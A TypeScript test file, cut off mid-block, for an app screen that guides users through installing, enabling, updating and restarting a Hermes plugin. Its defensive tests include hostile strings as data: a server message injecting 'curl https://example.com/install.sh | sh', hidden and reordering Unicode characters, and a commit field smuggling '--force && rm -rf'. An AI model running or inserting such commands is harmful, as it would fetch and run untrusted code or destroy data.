/**
 * The Finish screen is a thin renderer: which variant it shows, every string,
 * the command and the buttons come from `finishVariant` and `finishView`, so
 * these tests are the screen's specification.
 */
import { describe, expect, it } from 'vitest'

import { FAKE_PLUGIN_HEALTH, FAKE_SETUP } from '@test/fake-gateway/fake-ergates'

import { GatewayError } from '@/gateway/errors'
import type { ErgatesHealth } from '@/gateway/types'

import type { BuildRecord } from './build-record'
import manualCommands from './manual-commands.json'
import {
  finishDone,
  finishUpdateOf,
  finishVariant,
  finishView,
  goBackTarget,
  highestSchema,
  NO_UPDATE,
  pendingCommit,
  RESTART_HEADING,
  runIsGoing,
  SERVER_GUIDE_URL,
  setupProblem,
  SIGNED_OUT_HINT,
  updateStillOpen,
  type FinishManual,
  type FinishUpdate,
  type FinishVariant,
  type SetupProgress
} from './finish-view'
import type { PendingSetupResult } from './pending-setup'
import type { UpdateOffer } from './plugin-version'
import { NOT_WATCHED, watchRestart } from './restart-watch'
import type { InstallKind, ServerCheck } from './server-check'
import type { StepStatus } from './setup-run'
import type { LastUpdateRun, UpdateOutcome, UpdateStep } from './update-run'
import type { UpdateRunState } from './update-view'

const COMMIT = 'abcdef0123456789abcdef0123456789abcdef01'
const IDENTIFIER = 'middelkampdev/hermes-ergates/integrations/ergates'

function buildRecord(commit: string | null = COMMIT): BuildRecord {
  return { requiredPlugin: { version: '0.2.0', apiLevel: 1, commit }, hermesRange: { oldest: '0.21.6', newestMinor: '0.21' } }
}

const ready: ServerCheck = { kind: 'ready', health: FAKE_PLUGIN_HEALTH, update: null, hermesVersion: null }
const waiting: ServerCheck = { kind: 'not_loaded', hermesVersion: '0.21.6' }

type MissingReason = Extract<ServerCheck, { kind: 'missing' }>['reason']

function missing(reason: MissingReason): ServerCheck {
  return { kind: 'missing', hermesVersion: '0.21.6', oneTap: reason === null, reason }
}

function outdated(installKind: InstallKind): ServerCheck {
  return { kind: 'outdated', health: FAKE_PLUGIN_HEALTH, installKind, update: null, hermesVersion: '0.21.6' }
}

const install = (extra: Partial<Extract<FinishVariant, { kind: 'install' }>> = {}): FinishVariant => ({ kind: 'install', restart: false, failure: null, detail: null, ...extra })

const RESTART_LINES = [
  'Hermes service: systemctl --user restart hermes-dashboard',
  'Docker: docker restart <container name>',
  'Hermes Desktop: quit it and open it again',
  'Started by hand: stop hermes serve and start it again'
]
const RUN_INTRO = 'On your server, as the user that runs Hermes, run:'
const TURNED_OFF_INTRO = 'The plugin is on your server but turned off. On your server, as the user that runs Hermes, run:'
const INSTALL_COMMAND = `hermes plugins install ${IDENTIFIER} --ref ${COMMIT} --enable --yes-deps`
const UPDATE_COMMAND = `hermes plugins install ${IDENTIFIER} --force --ref ${COMMIT} --enable --yes-deps`
const ENABLE_COMMAND = 'hermes plugins enable ergates'
const disabled: ServerCheck = { kind: 'disabled', hermesVersion: '0.21.6' }

describe('finishVariant: what the check says the user has to do', () => {
  it.each<[string, MissingReason, boolean]>([
    ['in the tested range', null, false],
    ['newer than the tested range', 'untested', false],
    ['a build without a commit', 'no_commit', false],
    ['older than the oldest supported', 'too_old', true],
    ['a version the app cannot read', 'unknown', true]
  ])('installs by hand on a missing plugin on a Hermes %s, with a restart: %s', (_title, reason, restart) => {
    expect(finishVariant(missing(reason), null)).toEqual({ kind: 'install', restart, failure: null, detail: null })
  })

  it('keeps the failure Hermes gave and still asks for the restart an old Hermes needs', () => {
    const manual: FinishManual = { failure: 'refused', detail: 'Plugin blocked by policy' }

    expect(finishVariant(missing('too_old'), manual)).toEqual({ kind: 'install', restart: true, failure: 'refused', detail: 'Plugin blocked by policy' })
    expect(finishVariant(missing(null), manual)).toEqual({ kind: 'install', restart: false, failure: 'refused', detail: 'Plugin blocked by policy' })
  })

  it('turns the plugin on by hand when Hermes refused to enable it, where the server lists it turned off', () => {
    const manual: FinishManual = { failure: 'enable_refused', detail: 'enable refused: no' }

    expect(finishVariant(disabled, manual)).toEqual({ kind: 'enable', refused: true, detail: 'enable refused: no' })
  })

  it('knows a refused enable before the first check has answered, because the plugin is on the server then', () => {
    expect(finishVariant(null, { failure: 'enable_refused', detail: null })).toEqual({ kind: 'enable', refused: true, detail: null })
  })

  it('installs a plugin the server does not list, whatever the earlier failure was', () => {
    expect(finishVariant(missing(null), { failure: 'enable_refused', detail: 'enable refused: no' })).toEqual({ kind: 'install', restart: false, failure: 'enable_refused', detail: 'enable refused: no' })
  })

  it.each<[string, FinishManual | null]>([
    ['no failure', null],
    ['a blocked scan', { failure: 'scan_blocked', detail: null }],
    ['a refused install', { failure: 'refused', detail: 'Plugin blocked by policy' }]
  ])('turns on a plugin that is installed but turned off, after %s', (_title, manual) => {
    expect(finishVariant(disabled, manual)).toEqual({ kind: 'enable', refused: false, detail: null })
  })

  it('moves from the install command to the enable command once the plugin is on the server but turned off', () => {
    // The screen keeps the last variant a check named; a turned off plugin names its own.
    const manual: FinishManual = { failure: 'scan_blocked', detail: null }
    const held = finishVariant(missing(null), manual)
    const next = finishVariant(disabled, manual) ?? held

    expect(held).toEqual({ kind: 'install', restart: false, failure: 'scan_blocked', detail: null })
    expect(next).toEqual({ kind: 'enable', refused: false, detail: null })
    expect(finishView(next, buildRecord(), disabled)).toMatchObject({ intro: [TURNED_OFF_INTRO], command: ENABLE_COMMAND, restartLines: null })
  })

  it('shows the failure from the route before the first check has answered', () => {
    expect(finishVariant(null, { failure: 'no_git', detail: null })).toEqual({ kind: 'install', restart: false, failure: 'no_git', detail: null })
  })

  it('names no variant without a check and without a failure', () => {
    expect(finishVariant(null, null)).toBeNull()
  })

  it('asks for a restart when Hermes has the plugin but has not loaded it', () => {
    expect(finishVariant(waiting, null)).toEqual({ kind: 'restart', after: null })
  })

  it('asks for a restart when the update is installed and Hermes still runs the old code', () => {
    const restartNeeded: ServerCheck = { kind: 'restart_needed', health: FAKE_PLUGIN_HEALTH, hermesVersion: '0.21.6' }

    expect(finishVariant(restartNeeded, null)).toEqual({ kind: 'restart', after: null })
    expect(finishVariant(restartNeeded, { failure: 'scan_blocked', detail: null })).toEqual({ kind: 'restart', after: null })
  })

  it('lets the server win over an old failure once the plugin is installed', () => {
    expect(finishVariant(waiting, { failure: 'scan_blocked', detail: null })).toEqual({ kind: 'restart', after: null })
    expect(finishVariant(outdated('git install'), { failure: 'scan_blocked', detail: null })).toEqual({ kind: 'update' })
  })

  it.each<[InstallKind, FinishVariant]>([
    ['git install', { kind: 'update' }],
    ['manual copy', { kind: 'update_copy' }],
    ['deployment', { kind: 'deployment' }]
  ])('updates an outdated %s the way that kind of install is updated', (installKind, expected) => {
    expect(finishVariant(outdated(installKind), null)).toEqual(expected)
  })

  it.each<[string, ServerCheck]>([
    ['ready', ready],
    ['unknown', { kind: 'unknown' }],
    ['unavailable', { kind: 'unavailable', message: 'The store is busy.' }],
    ['app_outdated', { kind: 'app_outdated', health: FAKE_PLUGIN_HEALTH }]
  ])('names no variant for a %s check, so the screen keeps the one it had', (_title, check) => {
    expect(finishVariant(check, null)).toBeNull()
  })

  it('does not let a failure from the route replace the variant while the server cannot be reached or is ready', () => {
    const manual: FinishManual = { failure: 'refused', detail: null }

    expect(finishVariant({ kind: 'unknown' }, manual)).toBeNull()
    expect(finishVariant(ready, manual)).toBeNull()
  })
})

describe('manual-commands.json: the commands the screen and the live contract test share', () => {
  it('fills the install and update templates with the identifier and the commit, and the enable template with the name', () => {
    expect(manualCommands).toEqual({
      install: 'hermes plugins install {identifier} --ref {commit} --enable --yes-deps',
      update: 'hermes plugins install {identifier} --force --ref {commit} --enable --yes-deps',
      enable: 'hermes plugins enable {name}'
    })
    expect(finishView(install(), buildRecord(), waiting).command).toBe(INSTALL_COMMAND)
    expect(finishView({ kind: 'update' }, buildRecord(), waiting).command).toBe(UPDATE_COMMAND)
    expect(finishView({ kind: 'enable', refused: false, detail: null }, buildRecord(), disabled).command).toBe(ENABLE_COMMAND)
  })
})

describe('finishView: the instructions for each variant', () => {
  it('shows the install command with the full commit and the guide for the manual steps', () => {
    const view = finishView(install(), buildRecord(), waiting)

    expect(view).toEqual({
      title: 'Finish on your server',
      intro: [RUN_INTRO],
      command: INSTALL_COMMAND,
      restartLines: null,
      guide: { label: 'Open the guide', url: `${SERVER_GUIDE_URL}#manual` },
      status: 'Waiting for your server…',
      done: false,
      steps: null,
      primary: { label: 'Check now', action: 'check' }
    })
    expect(view.command).toContain(COMMIT)
  })

  it('adds the restart lines to an install on a Hermes that does not load the plugin by itself', () => {
    const view = finishView(install({ restart: true }), buildRecord(), waiting)

    expect(view.restartLines).toEqual(RESTART_LINES)
    expect(RESTART_HEADING).toBe('Then restart Hermes:')
  })

  it('moves the pin of a git install with --force before --ref, answers the dependency question, and asks for the restart', () => {
    const view = finishView({ kind: 'update' }, buildRecord(), waiting)

    expect(view.title).toBe('Finish on your server')
    expect(view.intro).toEqual([RUN_INTRO])
    expect(view.command).toBe(UPDATE_COMMAND)
    expect(view.restartLines).toEqual(RESTART_LINES)
    expect(view.guide).toEqual({ label: 'Open the guide', url: `${SERVER_GUIDE_URL}#manual` })
  })

  it('tells a manual copy to update its own folder to the version of this build, with no command', () => {
    const view = finishView({ kind: 'update_copy' }, buildRecord(), waiting)

    expect(view.intro).toEqual(['Update the folder you copied or linked the plugin from to version 0.2.0, then restart Hermes.'])
    expect(view.command).toBeNull()
    expect(view.restartLines).toEqual(RESTART_LINES)
    expect(view.guide.url).toBe(`${SERVER_GUIDE_URL}#manual`)
  })

  it('asks for a restart when Hermes has not loaded the plugin, with no command', () => {
    const view = finishView({ kind: 'restart', after: null }, buildRecord(), waiting)

    expect(view.title).toBe('Finish on your server')
    expect(view.intro).toEqual(['Hermes has not loaded the Ergates plugin yet.'])
    expect(view.command).toBeNull()
    expect(view.restartLines).toEqual(RESTART_LINES)
    expect(view.guide).toEqual({ label: 'Open the guide', url: `${SERVER_GUIDE_URL}#restart` })
  })

  it('sends a deployment to update the deployment, with no command and no restart lines', () => {
    const view = finishView({ kind: 'deployment' }, buildRecord(), outdated('deployment'))

    expect(view.title).toBe('Update your Ergates deployment')
    expect(view.intro).toEqual(['This server runs the Ergates deployment, which brings its own plugin. Update the deployment to get plugin 0.2.0.'])
    expect(view.command).toBeNull()
    expect(view.restartLines).toBeNull()
    expect(view.guide).toEqual({ label: 'Open the guide', url: `${SERVER_GUIDE_URL}#deployment` })
  })

  it.each<[string, FinishVariant]>([
    ['an install', install()],
    ['an install on an old Hermes', install({ restart: true })],
    ['an update', { kind: 'update' }]
  ])('shows no command and no restart lines for %s from a build without a commit, only the intro and the guide', (_title, variant) => {
    const view = finishView(variant, buildRecord(null), waiting)

    expect(view.command).toBeNull()
    expect(view.restartLines).toBeNull()
    expect(view.intro).toEqual([RUN_INTRO])
    expect(view.guide.url).toBe(`${SERVER_GUIDE_URL}#manual`)
    expect(view.status).toBe('Waiting for your server…')
  })

  it('shows no command without a build record, and names no version it does not know', () => {
    expect(finishView(install(), null, waiting).command).toBeNull()
    expect(finishView({ kind: 'update' }, null, waiting).restartLines).toBeNull()
    expect(finishView({ kind: 'update_copy' }, null, waiting).intro).toEqual(['Update the folder you copied or linked the plugin from to the newest version, then restart Hermes.'])
    expect(finishView({ kind: 'deployment' }, null, waiting).intro).toEqual(['This server runs the Ergates deployment, which brings its own plugin. Update the deployment to get the newest plugin.'])
  })
})

describe('finishView: why the install is by hand', () => {
  it.each<[string, FinishVariant, string]>([
    ['scan_blocked', install({ failure: 'scan_blocked' }), "Hermes's security check stopped the install. Run the command to see the findings."],
    ['no_git', install({ failure: 'no_git' }), 'Your server has no Git, which Hermes needs to install plugins. Install Git first.'],
    ['download_failed', install({ failure: 'download_failed' }), 'Your server could not download the plugin from GitHub.'],
    ['enable_refused', install({ failure: 'enable_refused', detail: 'enable refused: not allowed' }), 'Hermes refused to turn it on: enable refused: not allowed'],
    ['refused', install({ failure: 'refused', detail: 'Plugin blocked by policy' }), 'Hermes refused the install: Plugin blocked by policy']
  ])('puts the reason for %s above the command', (_code, variant, reason) => {
    const view = finishView(variant, buildRecord(), waiting)

    expect(view.intro).toEqual([reason, RUN_INTRO])
    expect(view.command).toBe(INSTALL_COMMAND)
  })

  it('shows the command that turns the plugin on, not the install command, when Hermes refused to enable it', () => {
    const view = finishView({ kind: 'enable', refused: true, detail: 'enable refused: not allowed' }, buildRecord(), disabled)

    expect(view).toEqual({
      title: 'Finish on your server',
      intro: ['Hermes refused to turn it on: enable refused: not allowed', RUN_INTRO],
      command: ENABLE_COMMAND,
      restartLines: null,
      guide: { label: 'Open the guide', url: `${SERVER_GUIDE_URL}#manual` },
      status: 'Waiting for your server…',
      done: false,
      steps: null,
      primary: { label: 'Check now', action: 'check' }
    })
  })

  it('says the plugin is turned off, with no refusal, when Hermes did not refuse to turn it on', () => {
    const view = finishView({ kind: 'enable', refused: false, detail: null }, buildRecord(), disabled)

    expect(view).toMatchObject({ intro: [TURNED_OFF_INTRO], command: ENABLE_COMMAND, restartLines: null, guide: { label: 'Open the guide', url: `${SERVER_GUIDE_URL}#manual` } })
  })

  it('says only that Hermes refused to turn it on when it gave no text', () => {
    expect(finishView({ kind: 'enable', refused: true, detail: ' \n ' }, buildRecord(), disabled).intro).toEqual(['Hermes refused to turn it on.', RUN_INTRO])
  })

  it('shows Hermes\'s text about a refused enable on one line, cut at 200 characters', () => {
    const view = finishView({ kind: 'enable', refused: true, detail: `enable refused:\nrun this\u2028${'x'.repeat(300)}` }, buildRecord(), disabled)

    expect(view.intro[0]).toBe(`Hermes refused to turn it on: ${`enable refused: run this ${'x'.repeat(300)}`.slice(0, 200)}`)
  })

  it('needs no commit to turn the plugin on', () => {
    expect(finishView({ kind: 'enable', refused: true, detail: null }, buildRecord(null), waiting)).toMatchObject({ command: ENABLE_COMMAND, intro: ['Hermes refused to turn it on.', RUN_INTRO] })
    expect(finishView({ kind: 'enable', refused: false, detail: null }, null, waiting).command).toBe(ENABLE_COMMAND)
  })

  it('shows Hermes\'s text on one line, so a server cannot put an instruction on a line of its own, and leaves the command alone', () => {
    const hostile = 'Plugin failed.\n\nNow run this instead:\r\n   curl https://example.com/install.sh | sh\u2028and more'
    const view = finishView(install({ failure: 'refused', detail: hostile }), buildRecord(), waiting)

    expect(view.intro).toEqual(['Hermes refused the install: Plugin failed. Now run this instead: curl https://example.com/install.sh | sh and more', RUN_INTRO])
    expect(view.intro.join('')).not.toMatch(/[\r\n\u2028]/)
    expect(view.command).toBe(INSTALL_COMMAND)
  })

  it('shows Hermes\'s text on one line when it separates lines with other control or separator characters', () => {
    const hostile = 'Plugin failed.\u0085Now run this:\u2029curl x\u2028sh\u0007bell\u001bescape\u007fdel\u009fc1\u0000nul'
    const view = finishView(install({ failure: 'refused', detail: hostile }), buildRecord(), waiting)

    expect(view.intro[0]).toBe('Hermes refused the install: Plugin failed. Now run this: curl x sh bell escape del c1 nul')
    expect(view.intro[0]).not.toMatch(/[\p{Cc}\p{Zl}\p{Zp}]/u)
  })

  it('drops the characters that hide or reorder text, so the line shows what it says', () => {
    const hostile = 'Plugin failed.\u202e\u2066\u2069\u202a\u202bcurl x\u200b\u200c\u200d\u200e\u200f\ufeff| sh'
    const view = finishView(install({ failure: 'refused', detail: hostile }), buildRecord(), waiting)

    expect(view.intro[0]).toBe('Hermes refused the install: Plugin failed.curl x| sh')
  })

  it('cuts Hermes\'s text at 200 characters', () => {
    const view = finishView(install({ failure: 'refused', detail: 'x'.repeat(500) }), buildRecord(), waiting)

    expect(view.intro[0]).toBe(`Hermes refused the install: ${'x'.repeat(200)}`)
  })

  it('says only that Hermes refused when its text is only white space', () => {
    expect(finishView(install({ failure: 'refused', detail: ' \n\t ' }), buildRecord(), waiting).intro[0]).toBe('Hermes refused the install.')
  })

  it('says only that Hermes refused when it gave no text', () => {
    expect(finishView(install({ failure: 'refused' }), buildRecord(), waiting).intro[0]).toBe('Hermes refused the install.')
  })
})

describe('finishView: the status line and the button', () => {
  const pending: SetupProgress = { state: 'pending' }
  const settled: SetupProgress = { state: 'done' }

  it('says it is checking before the first answer', () => {
    const view = finishView(install(), buildRecord(), null)

    expect(view.status).toBe('Checking…')
    expect(view.done).toBe(false)
    expect(view.primary).toEqual({ label: 'Check now', action: 'check' })
  })

  it.each<[string, ServerCheck]>([
    ['not loaded', waiting],
    ['waiting for a restart', { kind: 'restart_needed', health: FAKE_PLUGIN_HEALTH, hermesVersion: '0.21.6' }],
    ['outdated', outdated('git install')],
    ['unknown', { kind: 'unknown' }],
    ['missing', missing(null)]
  ])('keeps waiting while the check is %s', (_title, check) => {
    const view = finishView({ kind: 'restart', after: null }, buildRecord(), check)

    expect(view.status).toBe('Waiting for your server…')
    expect(view.done).toBe(false)
    expect(view.primary).toEqual({ label: 'Check now', action: 'check' })
  })

  it('reads a ready server as checking, without Done, until the plugin\'s setup has settled', () => {
    const view = finishView(install({ restart: true }), buildRecord(), ready, pending)

    expect(view).toMatchObject({ status: 'Checking…', done: false, primary: { label: 'Check now', action: 'check' }, intro: [], command: null, restartLines: null })
  })

  it('reads a ready server as checking when no setup state is given', () => {
    expect(finishView({ kind: 'restart', after: null }, buildRecord(), ready)).toMatchObject({ status: 'Checking…', done: false })
  })

  it('says the server is ready and leaves with Done once the setup has settled, without the instructions it no longer needs', () => {
    const view = finishView(install({ restart: true }), buildRecord(), ready, settled)

    expect(view).toMatchObject({ status: 'Your server is ready.', done: true, primary: { label: 'Done', action: 'done' }, intro: [], command: null, restartLines: null })
  })

  it.each<[string, ServerCheck | 'sign_in' | null]>([
    ['no check', null],
    ['a server that is waiting again', waiting],
    ['a check that could not tell', { kind: 'unknown' }],
    ['a refused session', 'sign_in']
  ])('stays done whatever a later check says: %s', (_title, check) => {
    const view = finishView({ kind: 'restart', after: null }, buildRecord(), check, settled)

    expect(view).toMatchObject({ status: 'Your server is ready.', done: true, primary: { label: 'Done', action: 'done' }, intro: [], command: null, restartLines: null })
  })

  it('keeps the title of the variant it had when the setup is done', () => {
    expect(finishView({ kind: 'deployment' }, buildRecord(), ready, settled).title).toBe('Update your Ergates deployment')
  })

  it('shows what went wrong with the setup of a ready server, and waits for the next check to try again', () => {
    const view = finishView({ kind: 'restart', after: null }, buildRecord(), ready, { state: 'failed', message: 'The plugin could not set up your agents.' })

    expect(view.status).toBe('The plugin could not set up your agents.')
    expect(view.done).toBe(false)
    expect(view.primary).toEqual({ label: 'Check now', action: 'check' })
  })

  it('ignores a setup problem while the server is not ready', () => {
    expect(finishView({ kind: 'restart', after: null }, buildRecord(), waiting, { state: 'failed', message: 'Old problem' }).status).toBe('Waiting for your server…')
  })

  it('asks to sign in again after a restart, with the way to stay signed in', () => {
    const view = finishView({ kind: 'restart', after: null }, buildRecord(), 'sign_in')

    expect(view.status).toBe(`Your server restarted. Sign in again to continue. ${SIGNED_OUT_HINT.text}`)
    expect(view.guide).toEqual({ label: 'How to stay signed in', url: `${SERVER_GUIDE_URL}#stay-signed-in` })
    expect(view.done).toBe(false)
    expect(view.primary).toEqual({ label: 'Sign in again', action: 'sign_in' })
    expect(view).toMatchObject({ intro: [], command: null, restartLines: null })
  })

  it('asks to sign in again before any variant is known', () => {
    const view = finishView(null, buildRecord(), 'sign_in')

    expect(view.title).toBe('Finish on your server')
    expect(view.primary?.action).toBe('sign_in')
    expect(view.guide.url).toBe(SIGNED_OUT_HINT.url)
  })

  it('lets a sign-in win over a setup problem', () => {
    expect(finishView({ kind: 'restart', after: null }, buildRecord(), 'sign_in', { state: 'failed', message: 'A problem' }).status).toContain('Sign in again to continue.')
  })

  it('shows only the title, the status and the guide before a variant is known', () => {
    expect(finishView(null, buildRecord(), null)).toEqual({
      title: 'Finish on your server',
      intro: [],
      command: null,
      restartLines: null,
      guide: { label: 'Open the guide', url: SERVER_GUIDE_URL },
      status: 'Checking…',
      done: false,
      steps: null,
      primary: { label: 'Check now', action: 'check' }
    })
  })
})

describe('finishDone: whether the page is done after it asked to finish the pending setup', () => {
  const ran: PendingSetupResult = { kind: 'done', report: FAKE_SETUP }
  const none: PendingSetupResult = { kind: 'none' }
  const waits: PendingSetupResult = { kind: 'waiting' }
  const restartNeededCheck: ServerCheck = { kind: 'restart_needed', health: FAKE_PLUGIN_HEALTH, hermesVersion: '0.21.6' }

  it.each<[string, PendingSetupResult, ServerCheck, boolean]>([
    ['the pending setup ran', ran, ready, true],
    ['the pending setup ran, whatever the check says now', ran, waiting, true],
    ['no setup is pending and the server is ready', none, ready, true],
    ['no setup is pending but Hermes has not loaded the plugin', none, waiting, false],
    ['no setup is pending but Hermes has to restart', none, restartNeededCheck, false],
    ['no setup is pending but the server could not be reached', none, { kind: 'unknown' }, false],
    ['the pending setup waits for the new code although the server is ready', waits, ready, false],
    ['the pending setup waits while Hermes has to restart', waits, restartNeededCheck, false]
  ])('%s', (_title, result, check, done) => {
    expect(finishDone(result, check)).toBe(done)
  })
})

describe('finishVariant and finishView: a ready server whose pending setup waits for the new code', () => {
  const waits: SetupProgress = { state: 'waiting' }

  it('keeps asking for the restart that starts the code the setup waits for, instead of reading the ready server as done', () => {
    expect(finishVariant(ready, null, NO_UPDATE, true)).toEqual({ kind: 'restart', after: null })
  })

  it('names the update the app started in that restart', () => {
    expect(finishVariant(ready, null, { ...NO_UPDATE, started: { target: COMMIT, previous: 'f'.repeat(40), previousSchema: 1 } }, true)).toEqual({ kind: 'restart', after: 'update' })
  })

  it('leaves a ready server to the setup when nothing waits', () => {
    expect(finishVariant(ready, null, NO_UPDATE, false)).toBeNull()
  })

  it('keeps the restart lines and the intro on a ready server while the setup waits, and waits', () => {
    const view = finishView({ kind: 'restart', after: 'update' }, buildRecord(), ready, waits)

    expect(view).toMatchObject({
      intro: ['The update is installed. Restart Hermes to start the new version.'],
      restartLines: RESTART_LINES,
      status: 'Waiting for your server…',
      done: false,
      primary: { label: 'Check now', action: 'check' }
    })
  })
})

describe('SIGNED_OUT_HINT: the sentence the sign-in screen shows too', () => {
  it('says why Hermes signs the user out and links to the guide for staying signed in', () => {
    expect(SIGNED_OUT_HINT).toEqual({
      text: 'Hermes signs you out when it restarts, unless your server has a fixed sign-in secret.',
      label: 'How to stay signed in',
      url: 'https://middelkamp.dev/ergates/server/#stay-signed-in'
    })
  })
})

describe('pendingCommit: when the screen records that the plugin is still to be set up', () => {
  it.each<[string, ServerCheck]>([
    ['a missing plugin', missing(null)],
    ['a missing plugin on a Hermes outside the tested range', missing('untested')],
    ['a plugin that is turned off', { kind: 'disabled', hermesVersion: '0.21.6' }],
    ['an outdated git install', outdated('git install')],
    ['an outdated manual copy', outdated('manual copy')]
  ])('records the commit of this build once the server answered with %s', (_title, check) => {
    expect(pendingCommit(check, buildRecord())).toBe(COMMIT)
  })

  it.each<[string, ServerCheck | null]>([
    ['no answer yet', null],
    ['a plugin Hermes has not loaded', waiting],
    ['a plugin that waits for a restart', { kind: 'restart_needed', health: FAKE_PLUGIN_HEALTH, hermesVersion: '0.21.6' }],
    ['an outdated deployment', outdated('deployment')],
    ['a ready plugin', ready],
    ['a check that could not tell', { kind: 'unknown' }],
    ['an unavailable plugin', { kind: 'unavailable', message: 'The store is busy.' }],
    ['a plugin newer than the app', { kind: 'app_outdated', health: FAKE_PLUGIN_HEALTH }]
  ])('records nothing for %s', (_title, check) => {
    expect(pendingCommit(check, buildRecord())).toBeNull()
  })

  it('records nothing without a commit', () => {
    expect(pendingCommit(missing(null), buildRecord(null))).toBeNull()
    expect(pendingCommit(missing(null), null)).toBeNull()
  })
})

describe('setupProblem: what a failed plugin setup shows', () => {
  it('shows the message of a gateway error, which carries no secrets', () => {
    expect(setupProblem(new GatewayError('network', 'Could not reach the gateway.'))).toBe('Could not reach the gateway.')
  })

  it('shows a plain sentence for an error from elsewhere', () => {
    expect(setupProblem(new Error('boom'))).toBe('Could not set up your agents.')
  })
})

const PREVIOUS = '1234567890abcdef1234567890abcdef12345678'
const PREVIOUS_COMMAND = `hermes plugins install ${IDENTIFIER} --force --ref ${PREVIOUS} --enable --yes-deps`
const offer: UpdateOffer = { from: '0.1.0', to: '0.2.0', commit: COMMIT, previous: PREVIOUS, previousSchema: 1 }
const readyWithUpdate: ServerCheck = { kind: 'ready', health: FAKE_PLUGIN_HEALTH, update: offer, hermesVersion: '0.21.6' }
const restartNeeded: ServerCheck = { kind: 'restart_needed', health: FAKE_PLUGIN_HEALTH, hermesVersion: '0.21.6' }
const unavailable: ServerCheck = { kind: 'unavailable', message: 'The store is busy.' }
const started = { target: COMMIT, previous: PREVIOUS, previousSchema: 1 }

function updating(extra: Partial<FinishUpdate> = {}): FinishUpdate {
  return { ...NO_UPDATE, started, ...extra }
}

function healthWithSchema(minSchema: number): ServerCheck {
  return { kind: 'restart_needed', health: { ...FAKE_PLUGIN_HEALTH, store: { plugin_schema_version: 1, min_schema_version: minSchema, writable: true } }, hermesVersion: '0.21.6' }
}

describe('finishVariant: an update the app started', () => {
  it('asks for the restart that starts the new version when the update is installed and the old code still answers', () => {
    expect(finishVariant(restartNeeded, null, updating())).toEqual({ kind: 'restart', after: 'update' })
  })

  it('asks for a plain restart when nothing started the update', () => {
    expect(finishVariant(restartNeeded, null, NO_UPDATE)).toEqual({ kind: 'restart', after: null })
  })

  it.each<[string, ServerCheck]>([
    ['Hermes has not loaded the plugin', waiting],
    ['the plugin cannot open its data', unavailable]
  ])('says the new version did not start, and offers to go back, when %s after the update', (_title, check) => {
    expect(finishVariant(check, null, updating())).toEqual({ kind: 'not_started', previous: PREVIOUS, goBack: true })
  })

  it('leaves an unavailable plugin outside an update to the status line', () => {
    expect(finishVariant(unavailable, null, NO_UPDATE)).toBeNull()
    expect(finishVariant(waiting, null, NO_UPDATE)).toEqual({ kind: 'restart', after: null })
  })

  it.each<[string, number | null, number | null, boolean]>([
    ['a store that still reads as the previous version does', 1, 1, true],
    ['a store older than the previous version', 1, 0, true],
    ['a store that no health read described', 1, null, true],
    ['a previous version that did not report its schema', null, 5, true],
    ['a store that moved past the previous version', 1, 2, false]
  ])('offers to go back with %s only when the previous version can still use it: %s', (_title, previousSchema, schemaSeen, goBack) => {
    const update = updating({ started: { ...started, previousSchema }, schemaSeen })

    expect(finishVariant(waiting, null, update)).toEqual({ kind: 'not_started', previous: PREVIOUS, goBack })
  })

  it('does not offer to go back to a commit that is not a full hash', () => {
    const update = updating({ started: { ...started, previous: '--force && rm -rf' } })

    expect(finishVariant(waiting, null, update)).toEqual({ kind: 'not_started', previous: '--force && rm -rf', goBack: false })
  })

  it('offers no second go back once the previous version is back, because going back ended the update', () => {
    const back = { ...NO_UPDATE, wentBack: { to: PREVIOUS, from: COMMIT } }

    expect(finishVariant(waiting, null, back)).toEqual({ kind: 'restart', after: null })
    expect(finishVariant(unavailable, null, back)).toBeNull()
  })

  /** The variant of each poll in turn, for an update run that ended asking for a restart. */
  function variantsAfterRestartRun(polls: ServerCheck[]): (FinishVariant | null)[] {
    let watch = NOT_WATCHED
    return polls.map(poll => {
      watch = watchRestart(watch, poll, false)
      return finishVariant(poll, null, finishUpdateOf({ started, schemaSeen: null, last: { outcome: { kind: 'restart' }, goingBack: false }, restartSeen: watch.seen, wentBack: undefined }))
    })
  }

  it('keeps asking for the restart while the update run waits for it, and after a poll that could not reach the server reads a plugin that does not come up as a new version that did not start', () => {
    expect(variantsAfterRestartRun([waiting, { kind: 'unknown' }, waiting])).toEqual([{ kind: 'restart', after: 'update' }, null, { kind: 'not_started', previous: PREVIOUS, goBack: true }])
  })

  it('reads the old code that stopped answering as a restart too, without any poll that could not reach the server', () => {
    expect(variantsAfterRestartRun([restartNeeded, waiting])).toEqual([{ kind: 'restart', after: 'update' }, { kind: 'not_started', previous: PREVIOUS, goBack: true }])
    expect(variantsAfterRestartRun([restartNeeded, unavailable])).toEqual([{ kind: 'restart', after: 'update' }, { kind: 'not_started', previous: PREVIOUS, goBack: true }])
  })

  it('keeps asking for the restart while the old code still answers', () => {
    expect(variantsAfterRestartRun([restartNeeded, restartNeeded, restartNeeded])).toEqual(Array(3).fill({ kind: 'restart', after: 'update' }))
  })

  it.each<[string, ServerCheck]>([
    ['Hermes has not loaded the plugin', waiting],
    ['the plugin cannot open its data', unavailable]
  ])('asks for the restart, not for going back, while the update run waits for it and %s', (_title, check) => {
    expect(finishVariant(check, null, updating({ awaitingRestart: true }))).toEqual({ kind: 'restart', after: 'update' })
  })

  it('does not say the previous version is back for a server that has another commit installed now', () => {
    const over = finishUpdateOf({ started: undefined, schemaSeen: null, last: { outcome: { kind: 'restart' }, goingBack: true }, restartSeen: false, wentBack: { to: PREVIOUS, from: COMMIT } })

    expect(finishVariant(restartNeeded, null, over)).toEqual({ kind: 'restart', after: null })
  })

  it('updates by hand when the app could not and the plugin still works', () => {
    expect(finishVariant(readyWithUpdate, null, updating({ byHand: true }))).toEqual({ kind: 'update' })
  })

  it.each<[string, ServerCheck, FinishUpdate]>([
    ['the update did not end by hand', readyWithUpdate, updating()],
    ['there is nothing to update', ready, updating({ byHand: true })],
    ['no update was started', readyWithUpdate, NO_UPDATE]
  ])('names no variant for a ready plugin when %s', (_title, check, update) => {
    expect(finishVariant(check, null, update)).toBeNull()
  })

  it('leaves the other checks as they were', () => {
    expect(finishVariant(outdated('git install'), null, updating())).toEqual({ kind: 'update' })
    expect(finishVariant(missing(null), null, updating())).toEqual({ kind: 'install', restart: false, failure: null, detail: null })
    expect(finishVariant(disabled, null, updating())).toEqual({ kind: 'enable', refused: false, detail: null })
  })
})

describe('finishVariant and finishView: after the app put the previous version back', () => {
  const back = { to: PREVIOUS, from: COMMIT }
  const installedAt = (commit: string, loaded: string | undefined = commit): ErgatesHealth => ({ ...FAKE_PLUGIN_HEALTH, install: { kind: 'git install', commit, loaded_commit: loaded, catalog_name: null } })
